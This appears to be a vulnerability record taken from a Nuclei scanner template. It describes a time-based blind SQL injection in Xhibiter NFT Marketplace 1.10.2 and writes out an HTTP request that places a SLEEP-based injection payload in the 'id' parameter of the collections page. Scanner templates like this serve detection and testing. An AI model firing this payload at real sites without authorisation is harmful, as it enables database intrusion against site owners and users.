# Nuclei Template: Xhibiter NFT Marketplace 1.10.2 - SQL Injection
**Template ID:** xhibiter-nft-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`xhibiter-nft-sqli.yaml`)

## Vulnerability Information & PoC

## Description
The Xhibiter NFT Marketplace version 1.10.2 is vulnerable to a SQL Injection vulnerability. This allows an attacker to manipulate SQL queries by injecting malicious SQL code through vulnerable input fields.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /collections?id=2'+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+'KEOa'='KEOa HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploit-db.com/exploits/52060
- https://blog.securelayer7.net/sql-injection-vulnerability-in-xhibiter-nft-marketplace/
- https://x.com/ExploitDB/status/1807782485549560196
